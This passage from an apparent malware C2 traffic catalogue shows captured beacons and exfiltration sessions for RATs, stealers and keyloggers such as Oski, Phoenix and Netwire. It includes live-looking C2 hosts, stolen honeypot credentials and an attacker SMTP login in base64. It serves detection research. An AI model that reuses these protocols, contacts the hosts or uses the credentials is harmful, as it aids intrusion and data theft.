00000040  0a ea 28 ad ba f6 87 d0 b7 4d 45 78 6a 71 84 19   ..(..... .MExjq..
00000050  34 cc c6 79                                        4..y
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-50.png "Nanocore 50")

#### NetSupport RAT
~~~
POST http://179.43.159.246/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Content-Length:    22
Host: 179.43.159.246
Connection: Keep-Alive

CMD=POLL
INFO=1
ACK=1
HTTP/1.1 200 OK
Server: NetSupport Gateway/1.6 (Windows NT)
Content-Type: application/x-www-form-urlencoded
Content-Length:    60
Connection: Keep-Alive

CMD=ENCD
ES=1
DATA=.g+$.{.. \....W...bb...).w}..o..X..xf...
POST http://179.43.159.246/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Content-Length:   232
Host: 179.43.159.246
Connection: Keep-Alive

CMD=ENCD
ES=1
DATA=u.2h.r..4.]..%y-.....=I...D3.W..i.7?....=@....F.f....&t.[..6ra..L.....?....>......5T.m.<..O....a.g.qwjW..I{~i...1......\.bH8Z&8.|gY@:......7. .\.(.K(...oC.x.m-.o.D.t....Lv...{.............=J.J...f.V=@.`t..i......
POST http://179.43.159.246/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Content-Length:    77
Host: 179.43.159.246
Connection: Keep-Alive

CMD=ENCD
ES=1
DATA=l3.<(T{.E.....V....k.9|||$(m..$C.M..=I0`!.....^.....?sq. 
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netsupport.png "NetSupport RAT")

#### Netwire
flag on "41 00 00 00 99" pattern in initial packet
~~~
00000000  41 00 00 00 99 80 3a e0 e8 5f d7 ea 8c af 76 cc   A.....:. ._....v.
00000010  c4 cc ad 5a 10 72 cc d0 5e 64 d8 50 80 fc b6 e6   ...Z.r.. ^d.P....
00000020  54 25 bf e0 ea 7f 7b e4 ff 54 70 e8 eb c0 fa 80   T%....{. .Tp.....
00000030  a0 a0 f3 a0 b0 0a 94 04 84 31 7c 3f e7 8c 90 c5   ........ .1|?....
00000040  ce c4 11 97 d9                                     .....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netwire.png "Netwire 40")

#### Neutrino
~~~
POST /panel/52/tasks.php HTTP/1.0
Host: slipcentral.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0
Content-type: application/x-www-form-urlencoded
Cookie: auth=bc00595440e801f8a5d2a2ad13b9791b
Content-length: 180

_wv=Y21kJjkwMDU5YzM3LTEzMjAtNDFhNC1iNThkLTJiNzVhOTg1MGQyZiZZV1J0YVc0Z09pQlZVMFZTTFZCRElEb2dWVk5GVWkxUVF3JTNEJTNEJldpbmRvd3MlMjA3JTIwKDMyLWJpdCkmMCZOJTJGQSY1LjEmMDguMTAuMjAxOSZOT05FHTTP/1.0 404 Not Found
Connection: close
X-Powered-By: PHP/5.6.40
Content-Type: text/html; charset=UTF-8
Content-Length: 1251
Date: Tue, 08 Oct 2019 00:52:53 GMT
Server: LiteSpeed
Vary: User-Agent

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /panel/52/tasks.php was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html><!---MTU3MDI2MTQzNjkyODM2MyNyYXRlIDUjMTQ2MzAyMDA2NjUxNjE2OSNzY3JlZW5zaG90IzE0NjkxMDAwOTY4ODIwMDAjYm90a2lsbGVyIzE1NzAyNjMxNzk5MTUwMDAjTE9BREVSIGh0dHA6Ly9zbGlwY2VudHJhbC5jb20vcGFuZWwvNTIvdXBsb2FkL2twKDEpLmV4ZSBydW4jMTU3MDI1OTIyNTI4Njg5NCNGSU5EICUyQWRhdCUyQSMxNTcwMjYyMjA3Njc0NDQzI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MzE4ODkxMzkyOCNETlMgaHR0cDovL3NsaXBjZW50cmFsLmNvbS9wYW5lbC81Mi91cGxvYWQveHNsYXllciBjdnYgY2hlY2tlci5leGUgcnVuIzE1NzAyNjM3NzM3MjkxNjUjRklORCB0eHQjMTU3MDI2Mzc4MDYwOTkwNCNGSU5EIGpwZyMxNTcwMjYyMjA3ODg2MjAwI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MjMwNDMzOTAxNyNGSU5EIHdlYmluamVjdHMudHh0IzE1NzAyNjI1MTM0ODkxMDYjRklORCAlNUMlMjZxdW90JTNCdHh0JTVDJTI2cXVvdCUzQiMxNTcwMjYzMzQxNzU4MzE3I0xPQURFUiBodHRwOi8vc2xpcGNlbnRyYWwuY29tL3BhbmVsLzUyL3VwbG9hZC96ZXVzIGNhbmFkYS5leGUgcnVuIzE1NzAyNzM4OTk0MTc4NTMjQ01ELVJlc3VsdCBwc2xpc3QjMTU3MDI3Mjk4MTIxNDQ0NSNDTUQtUmVzdWx0IHBzbGlzdCMxNTcwMjYzNzI2NjY5NzcyI0NNRC1SZXN1bHQgdGFza2xpc3Qj--->
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/neutrino.png "Neutrino")

#### Nukesped
~~~
POST /list.php?v=1530 HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=FE4149CA-3412-4743-9789-F6C0D0371C4F
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Content-Length: 385
Host: lastedforcast.com



--FE4149CA-3412-4743-9789-F6C0D0371C4F
Content-Disposition: form-data; name="_media_1"

15868
--FE4149CA-3412-4743-9789-F6C0D0371C4F
Content-Disposition: form-data; name="_media_2"

16
--FE4149CA-3412-4743-9789-F6C0D0371C4F
Content-Disposition: form-data; name="file"; filename="Sy2LbbDxqF1W.img"
Content-Type: octet-stream


--FE4149CA-3412-4743-9789-F6C0D0371C4F--

HTTP/1.1 200 OK
Date: Fri, 12 Jun 2020 03:32:37 GMT
Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.31
X-Powered-By: PHP/7.2.31
Content-Length: 1
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nukesped.png "Nukesped")

#### Orcus RAT
Machine name is SNI
~~~
....j...f..].....*".....L...^...xG.F..... ...../.5...
.....	.
.2.8.......%..........
...USER-PC.
......................M..]......~$....q.....d..o..t{8Y..& V5.....Xj..[...d.'v...3Y..9...}.....................0...0..0.......GY.I..l.C.!d.((n0
.	*.H..
.....0!1.0...U....OrcusServerCertificate0 .
181004205345Z..20691004205345Z0!1.0...U....OrcusServerCertificate0..0
.	*.H..
.........0..........C.}q.
.%/.J..U..+U!...Zk.&5.".	.on......w..NA..n..... ...ZM!...g..]....]Z...,
~h..?.......i'........u..... .r.|.o....2..A1KU.....0
.	*.H..
...........}.#zu....*...eW.+..c8..qk^.8....F..S"u.:..=...C  .K.z....P...Y..M[..d.2p..U....O=.|*4-....S;.b...I......1t.~Z..e.ETxk...r(u_g........a...?.y$t..LR.:..>...3j..gT		.....DJH..N.MJD.eb...I...}.V^5a...\@.S..........4..u_...l$y....k*......|...D..Z
.8S...i..z.9.&..5F.......A..V.c\.{..I...1|.W..td?...Y.....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/orcus.png "Orcus RAT")

#### Origin Keylogger
~~~
From: sp@globalfinancel.com
To: new@globalfinancel.com
Date: 17 Oct 2019 15:03:43 +0000
Subject: admin/USER-PC Recovered Accounts
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/17/2019 15:03:33<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br>IP: 18=
5.117.118.92=0A<hr>URL:      https://www.facebook.com/<br>=0D=0AU=
sername: honey@pot.com<br>=0D=0APassword: honeypass356<br>=0D=0AA=
pplication: Chrome<br>=0D=0A<hr>=0D=0AURL:      192.168.1.1<br>=0D=0A=
Username: honey@pot.com<br>=0D=0APassword: honeypass356<br>=0D=0A=
Application: Outlook<br>=0D=0A<hr>=0D=0A

From: sp@globalfinancel.com
To: new@globalfinancel.com
Date: 17 Oct 2019 15:03:43 +0000
Subject: admin/USER-PC Recovered Cookies
Content-Type: multipart/mixed;
 boundary=--boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244


----boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/17/2019 15:03:34<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br>IP: 18=
5.117.118.92=0A<hr>
----boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244
Content-Type: application/octet-stream; name=4dz3xb0p.hda.zip
Content-Transfer-Encoding: base64
Content-Disposition: attachment

UEsDBBQAAAgIAIRp/k5nVtI5VAoAAABwAAAjAAAANGR6M3hiMHAuaGRhL0Nocm9tZS9E
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/origin.png "Origin Keylogger")

#### Oski Stealer
~~~
POST /main.php HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 25
Host: gewe.tech
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A--
HTTP/1.1 200 OK
Connection: Keep-Alive
X-Powered-By: PHP/7.2.26
Content-Type: text/html; charset=UTF-8
Content-Length: 102
Content-Encoding: gzip
Vary: Accept-Encoding
Date: Wed, 26 Feb 2020 11:23:13 GMT
Server: LiteSpeed

1;USERPROFILE\Downloads;*.dat,*.key,*.txt;1;LOCALAPPDATA\;*.dat,*.key,*.txt;1;APPDATA\;*.dat,*.key,*.txt;1;USERPROFILE\Documents;*.dat,*.key,*.txt;1;USERPROFILE\Desktop;*.dat,*.key,*.txt;

POST / HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 60097
Host: gewe.tech
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="file"; filename="_4052981232.zip"
Content-Type: zip

PK.........ZZP..*.#...&..."...autofill/Google Chrome_Default.txtUT
..!UV^!UV^!UV^s.,*..K.M.tOL*.L....I...%..e....r..PK.........ZZP............-...autofill/Mozilla Firefox_qldyz51w.default.txtUT
..!UV^!UV^!UV^..PK.........ZZP................cc/Google Chrome_Default.txtUT
..!UV^!UV^!UV^..PK.........ZZP............!...cookies/Google Chrome_Default.txtUT
..!UV^!UV^!UV^..PK.........ZZP..).........,...cookies/Mozilla Firefox_qldyz51w.default.txtUT
..!UV^!UV^!UV^..KK.@...S.OI.{..YV.....5%.2.....vb...T..B.\]8........y..{.7....67.....\(..&C%:..F&.Ce.P5..k.#q.....b..?.`Y...kyW.Sv.B..Z.R=...[o..z^..uiR.-.eg..p.@g.....Y*..|...Q...cU..9R.J.
)....r...!....
Y.<.4.Pg...5..4"........@..]a.t.1.*.	*D..v<....._/..._ .......r......L"&.$C...x..PK.........ZZP8G..........
...passwords.txtUT
..!UV^ UV^ UV^...w.RpIMK,.)..
.w..Rp..O.IUp.(..M......
f....[.....%&.&..g.%....r........R+.
.K@..\....P....bcS3^..(......*S.r..Tk}..2sr...2.R..+`..d..PK.........ZZP.dwtv...T.......screenshot.jpgUT
..&UV^&UV^&UV^..u\TQ.5.. .."8 .. ... .CJJHJ..R
.#...C.t.Jww..t.{...}?....}...9...93..k.u]{....,.....$.....
......C....q........w0...X..a..=....S.....R...S>~BMJ............O... +..3.$(w.....E..M.........W...;....4...T\.4\..F...............B..q...=.A...*
...-4t.[.....~.-\t<*......b<..>.	.~.Z...>.o......]L.G.D..t...L.\.<.|../$$..edU..54.^j...653..t|............._.a...Q.1.bSR.....Y.E.%.e...U.....[Z.......GF........W.................\........\...[h.0..BA}.6...N.~...
......|.@.B....K....7r..$....../
ye..]......?......`..._...D......s..7.....yFo.......S*	....z..z.%^.~..8.... ....&T<.s.<..s.2.y}[..L.....i...4..h..+..
b6.Z.....U,.z0Xn.........K8.]...m_4..@...R.....Z..W.N...k~....+.....|....; *...6W'.....1f.....Y....,.5>!...m...7
.R'.f.E.`.M.,k..<	ua..W.D.+.Q.W .q......d...k.
...system.txtUT
i...PK.........ZZP................_1.zipUT
..&UV^!UV^!UV^PK....................PK...........ZZP..*.#...&...".	....... .......autofill/Google Chrome_Default.txtUT...!UV^PK...........ZZP............-.	....... ...t...autofill/Mozilla Firefox_qldyz51w.default.txtUT...!UV^PK...........ZZP..............	....... .......cc/Google Chrome_Default.txtUT...!UV^PK...........ZZP............!.	....... .......cookies/Google Chrome_Default.txtUT...!UV^PK...........ZZP..).........,.	....... ...q...cookies/Mozilla Firefox_qldyz51w.default.txtUT...!UV^PK...........ZZP8G..........
.	....... .......passwords.txtUT...!UV^PK...........ZZP.dwtv...T.....	....... .......screenshot.jpgUT...&UV^PK...........ZZP.pv.r... 2..
.	....... ...S...system.txtUT...&UV^PK...........ZZP..............	....... ......._1.zipUT...&UV^PK......	.	.....I.....
--1BEF0A57BE110FD467A--

HTTP/1.1 200 OK
Connection: Keep-Alive
X-Powered-By: PHP/7.2.26
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Date: Wed, 26 Feb 2020 11:23:19 GMT
Server: LiteSpeed
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/oski1.png "Oski")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/oski2.png "Oski")

#### Ostap
~~~
POST /angola/mabutu.php?pi=29h&tan=cezar&z=662343339&n=0&u=20&an=9468863238 HTTP/1.1
Connection: Keep-Alive
Content-Type: text/plain; Charset=UTF-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Content-Length: 1034
Host: 185.180.199.91

Microsoft Windows 7 Professional 6.1.7601*Locale:0409
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sent64.jse
USER-PC*DELL*DELL*0

System Idle Process*null
System*null
smss.exe*null
csrss.exe*null
wininit.exe*null
csrss.exe*null
winlogon.exe*null
services.exe*null
lsass.exe*null
lsm.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
spoolsv.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
dwm.exe*C:\Windows\system32\Dwm.exe
explorer.exe*C:\Windows\Explorer.EXE
taskhost.exe*C:\Windows\system32\taskhost.exe
SearchIndexer.exe*null
qemu-ga.exe*null
audiodg.exe*null
WmiPrvSE.exe*null
SearchProtocolHost.exe*null
windanr.exe*C:\Windows\system32\windanr.exe
OSPPSVC.EXE*null
wscript.exe*C:\Windows\system32\wscript.exe
wscript.exe*C:\Windows\system32\wscript.exe
SearchFilterHost.exe*null
WINWORD.EXE*C:\Program Files\Microsoft Office\Office14\WINWORD.EXE
WmiPrvSE.exe*null
~~~
~~~
https://51.83.206.98/1/1.php?g=m4&b=4a01758c&c=ACCOUNTDOMAIN@@LARRY-ACCOUNTIN@@Larry@@*172.16.0.2%3A%3A%5B00000001%5D%20Intel%28R%29%20Ethernet%20Connection%20I217-LM&233137

https://45.128.134.14/C821al/vc2Tmy.php?h=m2&j=4a01758c&l=ACCOUNTDOMAIN@@LARRY-ACCOUNTIN@@Larry@@*172.16.0.2%3A%3A%5B00000001%5D%20Intel%28R%29%20Ethernet%20Connection%20I217-LM&13742148
~~~

![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-1.png "Ostap")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-2.png "Ostap")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-3.png "Ostap")

#### Ousaban (banker)
~~~
#PRINCIPAL##Convite##ConvitRC#<#>Windows 10 Pro<#>DESKTOP-JGLLJLD<#>Nao<#>Windows Defender#SocketMain#<#>723442#UploadFile##RECEBENDO#<#>DESKTOP-JGLLJLD#ON-LINE##strPingOk##ON-LINE##strPingOk##ON-LINE##strPingOk##PLUGIN#<#>Nao#ON-LINE##strPingOk##COMPLETOU#<#>DESKTOP-JGLLJLD
~~~

![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ousaban.png "Ousaban")

#### Parallax RAT
~~~
00000000  04 c7 86 72 fd 82 d3 50  88 03 b3 9f bc 7f b1 f3   ...r...P ........
00000010  2f 44 27 83 80 9d ab d2  22 72 ff 33 88 8f 85 17   /D'..... "r.3....
00000020  fd af c9 1e 5e c9 68 88  70 a6 27 7e 6f 95 7b d5   ....^.h. p.'~o.{.
00000030  ed 48 fd 08 40 83 c2 36  c8 82 e4 50 6a f0 4e 9f   .H..@..6 ...Pj.N.
00000040  8a 7f eb f3 42 44 64 83  c8 9d e1 d2 65 72 bc 33   ....BDd. ....er.3
00000050  fe 8e aa 17 b4 af 88 1e  16 c9 25 88 29 a6 6b 7e   ........ ..%.).k~
00000060  26 95 4e d5 db 48 cc 08  3e d7 f8 0c 44 6e ff 59   &.N..H.. >...Dn.Y
00000070  79 dc 64 86 8b c1 cd a6  64 c0 da 77 bf 95 77 dd   y.d..... d..w..w.
00000080  7c a0 d5 f0 71 34 56 b2  80 d8 1e b6 89 22 cf 8b   |...q4V. ....."..
00000090  55 e4 05 4b 7b 6d 07 ef  93 6d f2 f3 4d ee ee 23   U..K{m.. .m..M..#
000000A0  8f 26 b1 7d 98 34 ae e7  26 08 d4 e8 1d 28 21 2a   .&.}.4.. &....(!*
000000B0  35 3b c6 0c 01 01 6c ed  54 a4 a0 2f a2 ef e0 1d   5;....l. T../....
000000C0  ce 34 b7 55 f8 2f fb 23  e9 50 cf e2 3a 35 50 bb   .4.U./.# .P..:5P.
000000D0  85 04 0a 91 c3 91 64 54  52 63 1f 8a 41 3a 25 d9   ......dT Rc..A:%.
000000E0  bf da af 3b ea 73 0b 9c  1f 58 02 f2 97 83 10 7b   ...;.s.. .X.....{
000000F0  96 4a 7a 57 8a 38 54 76  c9 fa 6a 41 25 8a 10 37   .JzW.8Tv ..jA%..7
00000100  03 52 d8 ca 85 2c 06 83  e3 ef 76 de 40 66 6c f0   .R...,.. ..v.@fl.
00000110  a2 68 39 9a ef 9e 7d 93  56 99 e9 2a               .h9...}. V..*
    00000000  04 c7 86 72 d6 82 d3 50  e5 a4 56 9f bc 7f b1 f3   ...r...P ..V.....
    00000010  2f 44 27 83 80 9d ab d2  aa 2b f8 35 a0 8e 85 17   /D'..... .+.5....
    00000020  fd af c9 1e 5e c9 68 88  70 a6 27 7e 6f 95 7b d5   ....^.h. p.'~o.{.
    00000030  ed 48 fd 08                                        .H..
0000011C  04 c7 86 72 d7 82 d3 50  e5 a4 56 9f a0 89 20 f3   ...r...P ..V... .
0000012C  2f 44 27 83 80 9d ab d2  22 72 ff 33 02 8e 85 17   /D'..... "r.3....
0000013C  fd af c9 1e 5e c9 68 88  70 a6 27 7e 6f 95 7b d5   ....^.h. p.'~o.{.
0000014C  ed 48 fd 08 fe 7c 59 c9  91 82 ba 50 4d f0 4b 9f   .H...|Y. ...PM.K.
0000015C  cf 7f c5 f3 5d 44 46 83  f4 9d c4 d2 50 72 c5 33   ....]DF. ....Pr.3
0000016C  b4 8e c6 17 c7 af 95 1e  09 c9 01 88 1e a6 43 7e   ........ ......C~
0000017C  00 95 0c d5 9e 48 a1 08  7f d7 b1 0c 05 6e b9 59   .....H.. .....n.Y
0000018C  2b dc 09 86 b8 c1 00 59  c7 3f ee 1e bc f1 7c aa   +......Y .?....|.
0000019C  21 80 87 d0 59 46 5c d4  e5 ab 92 20 19 b3 ae e7   !...YF\. ... ....
000001AC  75 e4 05 4b 7b 6d                                  u..K{m
    00000034  04 c7 86 72 d5 82 d3 50  23 f0 22 9f bc 7f b1 f3   ...r...P #.".....
    00000044  2f 44 27 83 80 9d ab d2  22 72 ff 33 a0 8e 85 17   /D'..... "r.3....
    00000054  fd af c9 1e 5e c9 68 88  70 a6 27 7e 6f 95 7b d5   ....^.h. p.'~o.{.
    00000064  ed 48 fd 08                                        .H..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parallax.png "Parallax")

#### ParasiteHTTP Loader
~~~
POST /index.php HTTP/1.1
Accept: */*
Host: 80.233.134.242
Content-Type: application/x-www-form-urlencoded
Connection: Close
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Content-Length: 280
Cache-Control: no-cache

BF6472F6DC3=Pi5tSiBItP-2ZyuFJlr31Jp58O0HzR74v0b4l2HaoHH537FeTxgg-msYkTvX6SSJ8FswUtoTg4O86o2HyWec2zuU6VFzTwgaFYw_28nFRIqcJv8TqrV7SYgFKSpbqY8aZhEcHY982M_flvAHMCjsD8-fxezzV5BSBDBbfYb5WZvBrsbJVlPwXYFmETrm7CrWF5LwvEFhu1Ecp14ymv1xPoCG0vfqAv5tsUn0H7mA5R5g7HAo2c3_r9fuZUtw9CKD46G2JnBF-A==

HTTP/1.1 200 OK
Date: Tue, 28 May 2019 08:46:26 GMT
Server: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.37
X-Powered-By: PHP/5.6.37
Set-Cookie: PHPSESSID=s3l4jdfsc8nkjghcevlshn3d67; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 416
Connection: close
Content-Type: text/html; charset=utf-8

8jQG4riRhJFWMlJ9RTKeV7k45+I3REM8JjIIBZ2ttxzjDFxOX7VjxuypIrJn9cQ1ZMg6fvgWSSpto3sivUfvUCHWLzb2ljPhPugPTYb0KsgResnAIFl+aoqF5m9bCyBd6PMoRLdOdsuDW+E3wrb7ZNpApXlX2htDZRNhaqfST8eBE9Cvl7H0vyUzY+BfH5M4fvvt71DCRt2OP31tgu7aMMxM0mUWvBBZcNpeZzLRdMFd0Ea1u3oM+vLWrhFLYGuCWN6TPaqlEpw/9pgLUI8BhxUYFOJvyTRIFwXmlQPWMY6qg0/l+b5Ha+SYCnLtw8Uyqilil+OBM+KM5MT4C4l9vkXsv/ID9X8ZRr2l9cHzlW5J7sLVrGeH26KmBrjqBM3c4Ini4VTZZCr5KDrsRpi21NaheQLGLA==
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasitehttp.png "ParasiteHTTP Loader")

#### Parasite Stealer aka Nexus
~~~
POST /gate.php HTTP/1.1
Content-Type: application/octet-stream;
User-Agent: Client
Host: 193.168.3.101
Content-Length: 1216583
Cache-Control: no-cache

{846ee340-7039-11de-9d20-806e6f6e6963}~;^;Windows 7 Professional x64~;^;1.0~;^;0~;^;0~;^;0~;^;0~;^;0~;^;8~;^;PK.........q?P..&.?.......	...about.logUT
..m.4^m.4^m.4^.U]..@.}.	..>j6...?.J.Z7K!....0,....au..;.6u.....s...\?......J.CP...%....wz..........,#][F.p...]d...8X.`...[a... .....{.A.A.-.}....e....o]...H`.."......o3...&x+H.k......6x.tM....E.r..H....	Ls\f.....`.......].h\.....4.1..V.W%X.D.....3Y....9.u,ch......$i..Ps........J.uN.%...........y...8.QF7....	.!.........d.8...d;&.....................l.m7....w...1.3......r..	{.i.....}Lr5h.w..8eB._..w.LJp..9....+..]....T.6-..o..-f7.Q.z;...<..W.%.pA.......Q..d.o..""".-xD`)..F=..]..*..I.s0...-..P*.1.I..2N....!..\...5....IB..(O....u..Z......=....}.$.?;7Lt....)."/Y...o5.$..e....G'U....xrB..PK..........?P............	...Browsers/UT
..`.5^`.5^`.5^PK.........q?PX.eS.P...P......Grabber.zipUT....... .......about.logUT...m.4^PK............?P............	.	..........Aw...Browsers/UT...`.5^PK...........q?PX.eS.P...P....	....... .......Grabber.zipUT...n.4^PK...........q?P.ci..:...|....	....... ....S..screen.jpegUT...m.4^PK....................

HTTP/1.1 200 OK
Date: Fri, 31 Jan 2020 21:13:48 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasite1.png "Parasite stealer")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasite2.png "Parasite stealer")

#### Phoenix Keylogger
~~~
220 us2.outbound.mailhostbox.com ESMTP Postfix
EHLO User-PC
250-us2.outbound.mailhostbox.com
250-PIPELINING
250-SIZE 41648128
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-AUTH=PLAIN LOGIN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
AUTH login dGhiQHRiaC10dy5jb20=
334 UGFzc3dvcmQ6
d2Fzc29kZWRvbjIy
235 2.7.0 Authentication successful
MAIL FROM:<thb@tbh-tw.com>
250 2.1.0 Ok
RCPT TO:<thb@tbh-tw.com>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
MIME-Version: 1.0
From: thb@tbh-tw.com
To: thb@tbh-tw.com
Date: 1 Nov 2019 14:38:03 +0000
Subject: PX | PSWD | Client Name: admin
Content-Type: multipart/mixed;
 boundary=--boundary_0_b03405b1-500a-4ac8-8975-daed06a88bd0


----boundary_0_b03405b1-500a-4ac8-8975-daed06a88bd0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

|------- Phoenix Keylogger - Passwords -------|=0D=0A+-----------=
-- Client INFO -------------+=0D=0AIP: 81.17.242.238=0D=0AHWID: 1=
78BFBFF000506E3=0D=0AOwner Name: USER-PC=0D=0AFull OS Name: Micro=
soft Windows 7 Professional =0D=0AOS Platform: Win32NTOS Version:=
 6.1.7601.65536=0D=0ASystem Boot Mode: Normal=0D=0APhysical Memor=
y: 3.25 GB  Available Of 4.09 GB =0D=0AVirtual Memory: 1.85 GB  A=
vailable Of 2.04 GB =0D=0ADate: 11/1/2019 2:37:59 PM=0D=0A-------=
----------------------------------=0D=0A
----boundary_0_b03405b1-500a-4ac8-8975-daed06a88bd0
Content-Type: application/octet-stream; name="PXRecoveries | 11/1/2019
 2:38:00 PM.txt"
Content-Transfer-Encoding: base64
Content-Disposition: attachment

77u/PT09PT09PT09PT09Q2hyb21lPT09PT09PT09PT09PT0NCkhvc3Q6IGh0dHBzOi8v
d3d3LmZhY2Vib29rLmNvbS8NClVzZXJuYW1lOiBob25leUBwb3QuY29tDQpQYXNzd29y
ZDogaG9uZXlwYXNzMzU2DQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KID09
PT09PT09PT09PU91dExvb2s9PT09PT09PT09PT09PQ0KSG9zdDogMTkyLjE2OC4xLjEN
ClVzZXJuYW1lOiBob25leUBwb3QuY29tDQpQYXNzd29yZDogaG9uZXlwYXNzMzU2DQo9
PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIA==
----boundary_0_b03405b1-500a-4ac8-8975-daed06a88bd0--
.
250 2.0.0 Ok: queued as 7CDF2181E51
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/phoenix.png "Phoenix")

#### Plugx
~~~
POST /update?wd=b0b9d49c HTTP/1.1
Accept: */*
x-debug: 0
x-request: 0
x-content: 61456
x-storage: 1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1;
Host: 185.239.226.61:8080
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache
~~~
~~~
